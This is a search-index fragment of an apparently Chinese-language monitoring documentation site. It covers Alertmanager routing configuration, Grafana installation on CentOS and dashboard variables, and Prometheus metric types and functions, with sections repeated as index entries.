#\u8981\u6309\u6240\u6709\u53ef\u80fd\u7684\u6807\u7b7e\u8fdb\u884c\u805a\u5408\uff0c\u8bf7\u4f7f\u7528\u7279\u6b8a\u503c\u201c\u2026\u201d\u4f5c\u4e3a\u552f\u4e00\u7684\u6807\u7b7e\u540d\u79f0\uff0c\u4f8b\u5982\uff1a #\u5206\u7ec4\u4f9d\u636e\uff1a['\u2026'] #\u8fd9\u5b9e\u9645\u4e0a\u5b8c\u5168\u7981\u7528\u4e86\u805a\u5408\uff0c\u901a\u8fc7\u6240\u6709 #\u6309\u539f\u6837\u53d1\u51fa\u8b66\u62a5\u3002\u8fd9\u4e0d\u53ef\u80fd\u662f\u4f60\u60f3\u8981\u7684\uff0c\u9664\u975e\u4f60\u6709 #\u8b66\u62a5\u91cf\u975e\u5e38\u4f4e\u6216\u4e0a\u6e38\u901a\u77e5\u7cfb\u7edf\u6267\u884c #\u5b83\u81ea\u5df1\u7684\u5206\u7ec4\u3002 [ group_by: '[' <labelname>, ... ']' ] #\u8b66\u62a5\u662f\u5426\u5e94\u7ee7\u7eed\u5339\u914d\u540e\u7eed\u540c\u7ea7\u8282\u70b9\u3002 [ continue: <boolean> | default = false ] #\u4e0d\u63a8\u8350\uff1a\u4f7f\u7528\u4e0b\u9762\u7684\u5339\u914d\u5668\u3002 #\u8b66\u62a5\u5fc5\u987b\u6ee1\u8db3\u7684\u4e00\u7ec4\u76f8\u7b49\u5339\u914d\u5668\u624d\u80fd\u5339\u914d\u8282\u70b9\u3002 match: [ <labelname>: <labelvalue>, ... ] #\u4e0d\u63a8\u8350\uff1a\u4f7f\u7528\u4e0b\u9762\u7684\u5339\u914d\u5668\u3002 #\u8b66\u62a5\u5fc5\u987b\u6ee1\u8db3\u7684\u4e00\u7ec4\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5668\u624d\u80fd\u5339\u914d\u8282\u70b9\u3002 match_re: [ <labelname>: <regex>, ... ] #\u8b66\u62a5\u5fc5\u987b\u5b8c\u6210\u4ee5\u5339\u914d\u8282\u70b9\u7684\u5339\u914d\u5668\u5217\u8868\u3002 matchers: [ - <matcher> ... ] #\u53d1\u9001\u7ec4\u901a\u77e5\u7684\u521d\u59cb\u7b49\u5f85\u65f6\u95f4 #\u8b66\u62a5\u6570\u91cf\u3002\u5141\u8bb8\u7b49\u5f85\u7981\u6b62\u8b66\u62a5\u5230\u8fbe\u6216\u6536\u96c6 #\u540c\u4e00\u7ec4\u7684\u66f4\u591a\u521d\u59cb\u8b66\u62a5(\u901a\u5e38\u662f0\u5230\u51e0\u5206\u949f\u3002\uff09 [ group_wait: <duration> | default = 30s ] #\u5728\u53d1\u9001\u6709\u5173\u65b0\u8b66\u62a5\u7684\u901a\u77e5\u4e4b\u524d\u8981\u7b49\u5f85\u591a\u957f\u65f6\u95f4 #\u6dfb\u52a0\u5230\u5df2\u53d1\u51fa\u521d\u59cb\u901a\u77e5\u7684\u8b66\u62a5\u7ec4\u4e2d #\u5df2\u7ecf\u53d1\u9001\u4e86(\u901a\u5e38\u7ea65\u5206\u949f\u6216\u4ee5\u4e0a\u3002\uff09 [ group_interval: <duration> | default = 5m ] #\u5982\u679c\u5df2\u7ecf\u53d1\u9001\u4e86\u901a\u77e5\uff0c\u5728\u518d\u6b21\u53d1\u9001\u901a\u77e5\u4e4b\u524d\u8981\u7b49\u5f85\u591a\u957f\u65f6\u95f4 #\u5df2\u6210\u529f\u53d1\u9001\u8b66\u62a5(\u901a\u5e38\u7ea63\u5c0f\u65f6\u6216\u4ee5\u4e0a\uff09\u3002 [ repeat_interval: <duration> | default = 4h ] #\u8def\u7531\u5e94\u9759\u97f3\u7684\u65f6\u95f4\u3002\u8fd9\u4e9b\u5fc5\u987b\u4e0e #\u201c\u9759\u97f3\u65f6\u95f4\u95f4\u9694\u201d\u90e8\u5206\u4e2d\u5b9a\u4e49\u7684\u9759\u97f3\u65f6\u95f4\u95f4\u9694\u3002 #\u6b64\u5916\uff0c\u6839\u8282\u70b9\u4e0d\u80fd\u6709\u4efb\u4f55\u9759\u97f3\u65f6\u95f4\u3002 #\u5f53\u8def\u7531\u88ab\u7981\u7528\u65f6\uff0c\u5b83\u4e0d\u4f1a\u53d1\u9001\u4efb\u4f55\u901a\u77e5\uff0c\u4f46\u662f #\u5426\u5219\u6b63\u5e38\u52a8\u4f5c\uff08\u5305\u62ec\u7ed3\u675f\u8def\u7531\u5339\u914d\u8fc7\u7a0b\uff09 #\u5982\u679c\u672a\u8bbe\u7f6e\u201ccontinue\u201d\u9009\u9879\u3002\uff09 mute_time_intervals: [ - <string> ...] #\u96f6\u4e2a\u6216\u591a\u4e2a\u5b50\u8def\u7531\u3002 routes: [ - <route> ... ] \u4f8b\u5b50 #\u5305\u542b\u5b50\u7ea7\u7ee7\u627f\u7684\u6240\u6709\u53c2\u6570\u7684\u6839\u8def\u7531 #\u5982\u679c\u672a\u8986\u76d6\uff0c\u5219\u8fd4\u56de\u8def\u7531\u3002 route: receiver: 'default-receiver' group_wait: 30s group_interval: 5m repeat_interval: 4h group_by: [cluster, alertname] #\u4e0e\u4ee5\u4e0b\u5b50\u8def\u7531\u4e0d\u5339\u914d\u7684\u6240\u6709\u8b66\u62a5 #\u5c06\u4fdd\u7559\u5728\u6839\u8282\u70b9\u4e0a\u5e76\u88ab\u5206\u6d3e\u5230\u201cdefault receiver\u201d\u3002 routes: #service=mysql\u6216service=cassandra\u7684\u6240\u6709\u8b66\u62a5 - receiver: 'database-pager' group_wait: 10s matchers: - service=~\"mysql|cassandra\" #\u6240\u6709\u5e26\u6709team=frontend\u6807\u7b7e\u7684\u8b66\u62a5\u90fd\u4e0e\u6b64\u5b50\u8def\u7531\u5339\u914d\u3002 - receiver: 'frontend-pager' group_by: [product, environment] matchers: - team=\"frontend\" \u63a5\u4e0b\u6765\u770b\u4e0b\u5b98\u65b9\u5728git\u5e93\u4e2d\u7684\u4f8b\u5b50 https://github.com/prometheus/alertmanager/blob/main/doc/examples/simple.yml","title":"Route"},{"location":"monitor/grafana/grafana_dashboard/","text":"Grafana Dashboard Grafana\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u53ef\u89c6\u5316\u5e73\u53f0\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e86\u5bf9Prometheus\u7684\u5b8c\u6574\u652f\u6301 Grafana\u53ef\u4ee5\u72ec\u7acb\u90e8\u7f72\uff0c\u5b89\u88c5\u8d77\u6765\u6bd4\u8f83\u65b9\u4fbf\u3002\u53ef\u4ee5yum\u76f4\u63a5\u5b89\u88c5\u542f\u52a8 \u6211\u6d4b\u8bd5\u7684\u7248\u672c\u4e3aGrafana v6.6.0 \u6dfb\u52a0\u6570\u636e\u6e90 \u542f\u52a8\u540e\uff0c\u8bbf\u95eeGrafana\u7684\u5730\u5740\u540e\uff0c\u9700\u8981\u6dfb\u52a0\u6570\u636e\u6e90\uff0c\u5982\u56fe\uff1a \u6570\u636e\u6e90\u6dfb\u52a0\u6bd4\u8f83\u7b80\u5355\uff0cGrafana\u53ef\u4ee5\u9488\u5bf9\u591a\u79cd\u6570\u636e\u8fdb\u884c\u51fa\u56fe\uff0c\u7b80\u5355\u7684\u7406\u89e3\u5c31\u662f\uff0c\u4f60\u7ed9\u4e00\u6bb5\u6570\u636e\uff0cGrafana\u53ef\u4ee5\u4e3a\u4f60\u628a\u56fe\u5f62\u753b\u51fa\u6765\uff0c\u8fd9\u4e2a\u6570\u636e\u53ef\u4ee5\u662f\u6570\u636e\u5e93\uff0c\u6587\u672c\uff0cAPI\u63a5\u53e3\uff0c\u4efb\u4f55\u53ef\u4ee5\u63d0\u4f9b\u6570\u636e\u7684\u4e1c\u897f\u3002 \u9488\u5bf9Prometheus\u7684\u6dfb\u52a0\u6bd4\u8f83\u7b80\u5355\uff0c\u6dfb\u52a0\u65f6\u53ea\u9700\u8981\u9009\u62e9Prometheus\uff0c\u8f93\u5165Prometheus\u7684\u5730\u5740\u5373\u53ef\uff0c\u5982\u4e0b\u56fe\uff1a \u6dfb\u52a0\u5b8c\u6210\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u5728Grafana\u521b\u5efa\u51fa\u6211\u4eec\u60f3\u8981\u7684\u56fe\u8868\u4e86\u3002","title":"Dashboard"},{"location":"monitor/grafana/grafana_dashboard/#grafana-dashboard","text":"Grafana\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u53ef\u89c6\u5316\u5e73\u53f0\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e86\u5bf9Prometheus\u7684\u5b8c\u6574\u652f\u6301 Grafana\u53ef\u4ee5\u72ec\u7acb\u90e8\u7f72\uff0c\u5b89\u88c5\u8d77\u6765\u6bd4\u8f83\u65b9\u4fbf\u3002\u53ef\u4ee5yum\u76f4\u63a5\u5b89\u88c5\u542f\u52a8 \u6211\u6d4b\u8bd5\u7684\u7248\u672c\u4e3aGrafana v6.6.0","title":"Grafana Dashboard"},{"location":"monitor/grafana/grafana_dashboard/#_1","text":"\u542f\u52a8\u540e\uff0c\u8bbf\u95eeGrafana\u7684\u5730\u5740\u540e\uff0c\u9700\u8981\u6dfb\u52a0\u6570\u636e\u6e90\uff0c\u5982\u56fe\uff1a \u6570\u636e\u6e90\u6dfb\u52a0\u6bd4\u8f83\u7b80\u5355\uff0cGrafana\u53ef\u4ee5\u9488\u5bf9\u591a\u79cd\u6570\u636e\u8fdb\u884c\u51fa\u56fe\uff0c\u7b80\u5355\u7684\u7406\u89e3\u5c31\u662f\uff0c\u4f60\u7ed9\u4e00\u6bb5\u6570\u636e\uff0cGrafana\u53ef\u4ee5\u4e3a\u4f60\u628a\u56fe\u5f62\u753b\u51fa\u6765\uff0c\u8fd9\u4e2a\u6570\u636e\u53ef\u4ee5\u662f\u6570\u636e\u5e93\uff0c\u6587\u672c\uff0cAPI\u63a5\u53e3\uff0c\u4efb\u4f55\u53ef\u4ee5\u63d0\u4f9b\u6570\u636e\u7684\u4e1c\u897f\u3002 \u9488\u5bf9Prometheus\u7684\u6dfb\u52a0\u6bd4\u8f83\u7b80\u5355\uff0c\u6dfb\u52a0\u65f6\u53ea\u9700\u8981\u9009\u62e9Prometheus\uff0c\u8f93\u5165Prometheus\u7684\u5730\u5740\u5373\u53ef\uff0c\u5982\u4e0b\u56fe\uff1a \u6dfb\u52a0\u5b8c\u6210\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u5728Grafana\u521b\u5efa\u51fa\u6211\u4eec\u60f3\u8981\u7684\u56fe\u8868\u4e86\u3002","title":"\u6dfb\u52a0\u6570\u636e\u6e90"},{"location":"monitor/grafana/grafana_install/","text":"\u90e8\u7f72 \u4e0b\u8f7d\u5730\u5740\uff1a https://grafana.com/grafana/download centos\u7cfb\u5217\u5b89\u88c5\uff1a [root@centos7 ~]# wget https://dl.grafana.com/oss/release/grafana-6.6.0-1.x86_64.rpm [root@centos7 ~]# sudo yum install grafana-6.6.0-1.x86_64.rpm [root@centos7 ~]# systemctl daemon-reload [root@centos7 ~]# systemctl start grafana-server [root@centos7 ~]# systemctl status grafana-server [root@centos7 ~]# grafana-server -v Version 6.6.0 (commit: 5c11bbdfb4, branch: HEAD) [root@centos7 ~]# sudo systemctl enable grafana-server Created symlink from /etc/systemd/system/multi-user.target.wants/grafana-server.service to /usr/lib/systemd/system/grafana-server.service. [root@centos7 ~]# curl 127.0.0.7:3000 <a href=\"/login\">Found</a>.","title":"Grafana\u90e8\u7f72"},{"location":"monitor/grafana/grafana_install/#_1","text":"\u4e0b\u8f7d\u5730\u5740\uff1a https://grafana.com/grafana/download centos\u7cfb\u5217\u5b89\u88c5\uff1a [root@centos7 ~]# wget https://dl.grafana.com/oss/release/grafana-6.6.0-1.x86_64.rpm [root@centos7 ~]# sudo yum install grafana-6.6.0-1.x86_64.rpm [root@centos7 ~]# systemctl daemon-reload [root@centos7 ~]# systemctl start grafana-server [root@centos7 ~]# systemctl status grafana-server [root@centos7 ~]# grafana-server -v Version 6.6.0 (commit: 5c11bbdfb4, branch: HEAD) [root@centos7 ~]# sudo systemctl enable grafana-server Created symlink from /etc/systemd/system/multi-user.target.wants/grafana-server.service to /usr/lib/systemd/system/grafana-server.service. [root@centos7 ~]# curl 127.0.0.7:3000 <a href=\"/login\">Found</a>.","title":"\u90e8\u7f72"},{"location":"monitor/grafana/grafana_var/","text":"\u53d8\u91cf\u5b9a\u4e49 Query \u7c7b\u578b\u7684\u53d8\u91cf\u5141\u8bb8\u60a8\u67e5\u8be2 Prometheus \u4ee5\u83b7\u53d6\u6307\u6807\u3001\u6807\u7b7e\u6216\u6807\u7b7e\u503c\u5217\u8868\u3002Prometheus \u6570\u636e\u6e90\u63d2\u4ef6\u63d0\u4f9b\u4ee5\u4e0b\u529f\u80fd\uff0c\u60a8\u53ef\u4ee5\u5728 Query \u8f93\u5165\u5b57\u6bb5\u4e2d\u4f7f\u7528\u3002 \u59d3\u540d \u63cf\u8ff0 label_names() \u8fd4\u56de\u6807\u7b7e\u540d\u79f0\u5217\u8868\u3002 label_values(label) \u8fd4\u56de label \u6bcf\u4e2a\u6307\u6807\u4e2d\u7684\u6807\u7b7e\u503c\u5217\u8868\u3002 label_values(metric, label) \u8fd4\u56de label \u6307\u5b9a\u6307\u6807\u4e2d \u7684\u6807\u7b7e\u503c\u5217\u8868\u3002 metrics(metric) \u8fd4\u56de\u4e0e\u6307\u5b9a metric \u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u7684\u6307\u6807\u5217\u8868\u3002 query_result(query) \u8fd4\u56de \u7684 Prometheus \u67e5\u8be2\u7ed3\u679c\u5217\u8868 query \u3002 \u5728\u9762\u677f\u7684\u8bbe\u7f6e\u4e2d\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e9b\u53d8\u91cf\uff0c\u4f9bGrafana\u5927\u5c4f\u4e2d\u7684\u6570\u636e\u516c\u5f0f\u8c03\u7528 \u4f8b\u5982\uff0c\u83b7\u53d6\u96c6\u7fa4\u603b\u5171\u7684\u5185\u5b58\u5927\u5c0f \u672c\u8eabsum(node_memory_MemTotal_bytes)\u662f\u53e5promSQL\uff0c\u9700\u8981\u653e\u8fdb query_result(query) \u4e2d\uff0c\u4f46\u662f\u67e5\u51fa\u6765\u7684\u6570\u636e\u662f\u5e26\u6807\u7b7e\u548c\u65f6\u95f4\u6233\u7684 {} 2792702402560 1631610328000 \uff0c\u8fd9\u65f6\u5019\u9700\u8981\u6b63\u5219/. ([^\\ ] ) .*/\u6765\u8fc7\u6ee4\u51fa\u4e2d\u95f4\u7684\u6570\u5b57 \u5173\u4e8eGrafana\u6dfb\u52a0Prometheus\u6570\u636e\uff0c\u5b98\u7f51\u6587\u6863\u4e3ahttps://grafana.com/docs/grafana/latest/datasources/prometheus/ \u4e2a\u4eba\u535a\u5ba2\u8bb2\u89e3\uff1a https://yunlzheng.gitbook.io/prometheus-book/part-ii-prometheus-jin-jie/grafana/templating https://www.jianshu.com/p/aa50419b4ed3","title":"Grafana\u6dfb\u52a0\u53d8\u91cf"},{"location":"monitor/prometheus/Exporter_Metrics/","text":"Exporter Metrics\u89e3\u91ca \u5728\u5b98\u65b9\u7684exporter\u4ecb\u7ecd\u9875\u9762\u4e2d\uff0c\u4ecb\u7ecd\u4e86\u7f16\u5199exporter\u516c\u7ea6\u548cMetrics\u7684\u89e3\u91ca\uff0c\u5730\u5740\uff1ahttps://prometheus.io/docs/instrumenting/writing_clientlibs/#labels \u5b98\u65b9\u5b9a\u4e49\u4e86\u4e3b\u89814\u79cd\u6307\u6807(metric type)\uff1aCounter\uff08\u8ba1\u6570\u5668\uff09\u3001Gauge\uff08\u4eea\u8868\u76d8\uff09\u3001Histogram\uff08\u76f4\u65b9\u56fe\uff09\u3001Summary\uff08\u6458\u8981\uff09\u3002 \u8bbf\u95ee http://192.168.70.131:9100/metrics \u4f1a\u8fd4\u56de\u5982\u4e0b\u8fd9\u79cd\u683c\u5f0f\u7684\u6570\u636e\uff1a # HELP node_cpu Seconds the cpus spent in each mode. # TYPE node_cpu counter node_cpu{cpu=\"cpu0\",mode=\"idle\"} 362812.7890625 #HELP\u89e3\u91ca\u4e86\u8be5\u6570\u636e\u662f\u4ec0\u4e48 #TYPE\u4f1a\u8bf4\u8be5\u6570\u636e\u662f\u4ec0\u4e48\u6307\u6807 Counter\uff1a\u53ea\u589e\u4e0d\u51cf\u7684\u8ba1\u6570\u5668 Counter\u7c7b\u578b\u7684\u6307\u6807\u5176\u5de5\u4f5c\u65b9\u5f0f\u548c\u8ba1\u6570\u5668\u4e00\u6837\uff0c\u53ea\u589e\u4e0d\u51cf\uff08\u9664\u975e\u7cfb\u7edf\u53d1\u751f\u91cd\u7f6e\uff09\u3002\u5e38\u89c1\u7684\u76d1\u63a7\u6307\u6807\uff0c\u5982http_requests_total\uff0cnode_cpu\u90fd\u662fCounter\u7c7b\u578b\u7684\u76d1\u63a7\u6307\u6807\u3002 \u4e00\u822c\u5728\u5b9a\u4e49Counter\u7c7b\u578b\u6307\u6807\u7684\u540d\u79f0\u65f6\u63a8\u8350\u4f7f\u7528_total\u4f5c\u4e3a\u540e\u7f00\u3002 Counter\u662f\u4e00\u4e2a\u7b80\u5355\u4f46\u6709\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u4f8b\u5982\u6211\u4eec\u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8bb0\u5f55\u67d0\u4e9b\u4e8b\u4ef6\u53d1\u751f\u7684\u6b21\u6570\uff0c\u901a\u8fc7\u4ee5\u65f6\u5e8f\u7684\u5f62\u5f0f\u5b58\u50a8\u8fd9\u4e9b\u6570\u636e\uff0c\u6211\u4eec\u53ef\u4ee5\u8f7b\u677e\u7684\u4e86\u89e3\u8be5\u4e8b\u4ef6\u4ea7\u751f\u901f\u7387\u7684\u53d8\u5316\u3002 Gauge\uff1a\u53ef\u589e\u53ef\u51cf\u7684\u4eea\u8868\u76d8 \u4e0eCounter\u4e0d\u540c\uff0cGauge\u7c7b\u578b\u7684\u6307\u6807\u4fa7\u91cd\u4e8e\u53cd\u5e94\u7cfb\u7edf\u7684\u5f53\u524d\u72b6\u6001\u3002\u56e0\u6b64\u8fd9\u7c7b\u6307\u6807\u7684\u6837\u672c\u6570\u636e\u53ef\u589e\u53ef\u51cf\u3002\u5e38\u89c1\u6307\u6807\u5982\uff1anode_memory_MemFree\uff08\u4e3b\u673a\u5f53\u524d\u7a7a\u95f2\u7684\u5185\u5bb9\u5927\u5c0f\uff09\u3001node_memory_MemAvailable\uff08\u53ef\u7528\u5185\u5b58\u5927\u5c0f\uff09\u90fd\u662fGauge\u7c7b\u578b\u7684\u76d1\u63a7\u6307\u6807 Histogram\u548cSummary \u9664\u4e86Counter\u548cGauge\u7c7b\u578b\u7684\u76d1\u63a7\u6307\u6807\u4ee5\u5916\uff0cPrometheus\u8fd8\u5b9a\u4e49\u4e86Histogram\u548cSummary\u7684\u6307\u6807\u7c7b\u578b\u3002Histogram\u548cSummary\u4e3b\u7528\u7528\u4e8e\u7edf\u8ba1\u548c\u5206\u6790\u6837\u672c\u7684\u5206\u5e03\u60c5\u51b5\u3002 \u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4eba\u4eec\u90fd\u503e\u5411\u4e8e\u4f7f\u7528\u67d0\u4e9b\u91cf\u5316\u6307\u6807\u7684\u5e73\u5747\u503c\uff0c\u4f8b\u5982CPU\u7684\u5e73\u5747\u4f7f\u7528\u7387\u3001\u9875\u9762\u7684\u5e73\u5747\u54cd\u5e94\u65f6\u95f4\u3002\u8fd9\u79cd\u65b9\u5f0f\u7684\u95ee\u9898\u5f88\u660e\u663e\uff0c\u4ee5\u7cfb\u7edfAPI\u8c03\u7528\u7684\u5e73\u5747\u54cd\u5e94\u65f6\u95f4\u4e3a\u4f8b\uff1a\u5982\u679c\u5927\u591a\u6570API\u8bf7\u6c42\u90fd\u7ef4\u6301\u5728100ms\u7684\u54cd\u5e94\u65f6\u95f4\u8303\u56f4\u5185\uff0c\u800c\u4e2a\u522b\u8bf7\u6c42\u7684\u54cd\u5e94\u65f6\u95f4\u9700\u89815s\uff0c\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\u67d0\u4e9bWEB\u9875\u9762\u7684\u54cd\u5e94\u65f6\u95f4\u843d\u5230\u4e2d\u4f4d\u6570\u7684\u60c5\u51b5\uff0c\u800c\u8fd9\u79cd\u73b0\u8c61\u88ab\u79f0\u4e3a\u957f\u5c3e\u95ee\u9898\u3002 \u4e3a\u4e86\u533a\u5206\u662f\u5e73\u5747\u7684\u6162\u8fd8\u662f\u957f\u5c3e\u7684\u6162\uff0c\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u6309\u7167\u8bf7\u6c42\u5ef6\u8fdf\u7684\u8303\u56f4\u8fdb\u884c\u5206\u7ec4\u3002\u4f8b\u5982\uff0c\u7edf\u8ba1\u5ef6\u8fdf\u57280~10ms\u4e4b\u95f4\u7684\u8bf7\u6c42\u6570\u6709\u591a\u5c11\u800c10~20ms\u4e4b\u95f4\u7684\u8bf7\u6c42\u6570\u53c8\u6709\u591a\u5c11\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5feb\u901f\u5206\u6790\u7cfb\u7edf\u6162\u7684\u539f\u56e0\u3002Histogram\u548cSummary\u90fd\u662f\u4e3a\u4e86\u80fd\u591f\u89e3\u51b3\u8fd9\u6837\u95ee\u9898\u7684\u5b58\u5728\uff0c\u901a\u8fc7Histogram\u548cSummary\u7c7b\u578b\u7684\u76d1\u63a7\u6307\u6807\uff0c\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u4e86\u89e3\u76d1\u63a7\u6837\u672c\u7684\u5206\u5e03\u60c5\u51b5\u3002","title":"Exporter Metrics\u89e3\u91ca"},{"location":"monitor/prometheus/Exporter_Metrics/#exporter-metrics","text":"\u5728\u5b98\u65b9\u7684exporter\u4ecb\u7ecd\u9875\u9762\u4e2d\uff0c\u4ecb\u7ecd\u4e86\u7f16\u5199exporter\u516c\u7ea6\u548cMetrics\u7684\u89e3\u91ca\uff0c\u5730\u5740\uff1ahttps://prometheus.io/docs/instrumenting/writing_clientlibs/#labels \u5b98\u65b9\u5b9a\u4e49\u4e86\u4e3b\u89814\u79cd\u6307\u6807(metric type)\uff1aCounter\uff08\u8ba1\u6570\u5668\uff09\u3001Gauge\uff08\u4eea\u8868\u76d8\uff09\u3001Histogram\uff08\u76f4\u65b9\u56fe\uff09\u3001Summary\uff08\u6458\u8981\uff09\u3002 \u8bbf\u95ee http://192.168.70.131:9100/metrics \u4f1a\u8fd4\u56de\u5982\u4e0b\u8fd9\u79cd\u683c\u5f0f\u7684\u6570\u636e\uff1a # HELP node_cpu Seconds the cpus spent in each mode. # TYPE node_cpu counter node_cpu{cpu=\"cpu0\",mode=\"idle\"} 362812.7890625 #HELP\u89e3\u91ca\u4e86\u8be5\u6570\u636e\u662f\u4ec0\u4e48 #TYPE\u4f1a\u8bf4\u8be5\u6570\u636e\u662f\u4ec0\u4e48\u6307\u6807","title":"Exporter Metrics\u89e3\u91ca"},{"location":"monitor/prometheus/Exporter_Metrics/#counter","text":"Counter\u7c7b\u578b\u7684\u6307\u6807\u5176\u5de5\u4f5c\u65b9\u5f0f\u548c\u8ba1\u6570\u5668\u4e00\u6837\uff0c\u53ea\u589e\u4e0d\u51cf\uff08\u9664\u975e\u7cfb\u7edf\u53d1\u751f\u91cd\u7f6e\uff09\u3002\u5e38\u89c1\u7684\u76d1\u63a7\u6307\u6807\uff0c\u5982http_requests_total\uff0cnode_cpu\u90fd\u662fCounter\u7c7b\u578b\u7684\u76d1\u63a7\u6307\u6807\u3002 \u4e00\u822c\u5728\u5b9a\u4e49Counter\u7c7b\u578b\u6307\u6807\u7684\u540d\u79f0\u65f6\u63a8\u8350\u4f7f\u7528_total\u4f5c\u4e3a\u540e\u7f00\u3002 Counter\u662f\u4e00\u4e2a\u7b80\u5355\u4f46\u6709\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u4f8b\u5982\u6211\u4eec\u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8bb0\u5f55\u67d0\u4e9b\u4e8b\u4ef6\u53d1\u751f\u7684\u6b21\u6570\uff0c\u901a\u8fc7\u4ee5\u65f6\u5e8f\u7684\u5f62\u5f0f\u5b58\u50a8\u8fd9\u4e9b\u6570\u636e\uff0c\u6211\u4eec\u53ef\u4ee5\u8f7b\u677e\u7684\u4e86\u89e3\u8be5\u4e8b\u4ef6\u4ea7\u751f\u901f\u7387\u7684\u53d8\u5316\u3002","title":"Counter\uff1a\u53ea\u589e\u4e0d\u51cf\u7684\u8ba1\u6570\u5668"},{"location":"monitor/prometheus/Exporter_Metrics/#gauge","text":"\u4e0eCounter\u4e0d\u540c\uff0cGauge\u7c7b\u578b\u7684\u6307\u6807\u4fa7\u91cd\u4e8e\u53cd\u5e94\u7cfb\u7edf\u7684\u5f53\u524d\u72b6\u6001\u3002\u56e0\u6b64\u8fd9\u7c7b\u6307\u6807\u7684\u6837\u672c\u6570\u636e\u53ef\u589e\u53ef\u51cf\u3002\u5e38\u89c1\u6307\u6807\u5982\uff1anode_memory_MemFree\uff08\u4e3b\u673a\u5f53\u524d\u7a7a\u95f2\u7684\u5185\u5bb9\u5927\u5c0f\uff09\u3001node_memory_MemAvailable\uff08\u53ef\u7528\u5185\u5b58\u5927\u5c0f\uff09\u90fd\u662fGauge\u7c7b\u578b\u7684\u76d1\u63a7\u6307\u6807","title":"Gauge\uff1a\u53ef\u589e\u53ef\u51cf\u7684\u4eea\u8868\u76d8"},{"location":"monitor/prometheus/Exporter_Metrics/#histogramsummary","text":"\u9664\u4e86Counter\u548cGauge\u7c7b\u578b\u7684\u76d1\u63a7\u6307\u6807\u4ee5\u5916\uff0cPrometheus\u8fd8\u5b9a\u4e49\u4e86Histogram\u548cSummary\u7684\u6307\u6807\u7c7b\u578b\u3002Histogram\u548cSummary\u4e3b\u7528\u7528\u4e8e\u7edf\u8ba1\u548c\u5206\u6790\u6837\u672c\u7684\u5206\u5e03\u60c5\u51b5\u3002 \u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4eba\u4eec\u90fd\u503e\u5411\u4e8e\u4f7f\u7528\u67d0\u4e9b\u91cf\u5316\u6307\u6807\u7684\u5e73\u5747\u503c\uff0c\u4f8b\u5982CPU\u7684\u5e73\u5747\u4f7f\u7528\u7387\u3001\u9875\u9762\u7684\u5e73\u5747\u54cd\u5e94\u65f6\u95f4\u3002\u8fd9\u79cd\u65b9\u5f0f\u7684\u95ee\u9898\u5f88\u660e\u663e\uff0c\u4ee5\u7cfb\u7edfAPI\u8c03\u7528\u7684\u5e73\u5747\u54cd\u5e94\u65f6\u95f4\u4e3a\u4f8b\uff1a\u5982\u679c\u5927\u591a\u6570API\u8bf7\u6c42\u90fd\u7ef4\u6301\u5728100ms\u7684\u54cd\u5e94\u65f6\u95f4\u8303\u56f4\u5185\uff0c\u800c\u4e2a\u522b\u8bf7\u6c42\u7684\u54cd\u5e94\u65f6\u95f4\u9700\u89815s\uff0c\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\u67d0\u4e9bWEB\u9875\u9762\u7684\u54cd\u5e94\u65f6\u95f4\u843d\u5230\u4e2d\u4f4d\u6570\u7684\u60c5\u51b5\uff0c\u800c\u8fd9\u79cd\u73b0\u8c61\u88ab\u79f0\u4e3a\u957f\u5c3e\u95ee\u9898\u3002 \u4e3a\u4e86\u533a\u5206\u662f\u5e73\u5747\u7684\u6162\u8fd8\u662f\u957f\u5c3e\u7684\u6162\uff0c\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u6309\u7167\u8bf7\u6c42\u5ef6\u8fdf\u7684\u8303\u56f4\u8fdb\u884c\u5206\u7ec4\u3002\u4f8b\u5982\uff0c\u7edf\u8ba1\u5ef6\u8fdf\u57280~10ms\u4e4b\u95f4\u7684\u8bf7\u6c42\u6570\u6709\u591a\u5c11\u800c10~20ms\u4e4b\u95f4\u7684\u8bf7\u6c42\u6570\u53c8\u6709\u591a\u5c11\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5feb\u901f\u5206\u6790\u7cfb\u7edf\u6162\u7684\u539f\u56e0\u3002Histogram\u548cSummary\u90fd\u662f\u4e3a\u4e86\u80fd\u591f\u89e3\u51b3\u8fd9\u6837\u95ee\u9898\u7684\u5b58\u5728\uff0c\u901a\u8fc7Histogram\u548cSummary\u7c7b\u578b\u7684\u76d1\u63a7\u6307\u6807\uff0c\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u4e86\u89e3\u76d1\u63a7\u6837\u672c\u7684\u5206\u5e03\u60c5\u51b5\u3002","title":"Histogram\u548cSummary"},{"location":"monitor/prometheus/function/","text":"\u51fd\u6570 avg_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u70b9\u7684\u5e73\u5747\u503c\u3002 range-vector \uff1a\u8fd9\u4e2a\u4ee3\u8868\u4e00\u6bb5\u65f6\u95f4\u6240\u6709\u7684\u503c\uff0c\u6bd4\u5982\u8fd9\u79cd\uff1anode_procs_running[1m] \u7136\u540e\u901a\u8fc7avg_over_time\u8ba1\u7b971\u5206\u949f\u5185\u7684\u5e73\u5747\u503c\uff0c\u4f8b\u5982\uff1aavg_over_time(node_procs_running[1m]) max_over_time(range-vector)\uff1a\u6307\u5b9a\u533a\u95f4\u5185\u6240\u6709\u70b9\u7684\u6700\u5927\u503c\u3002 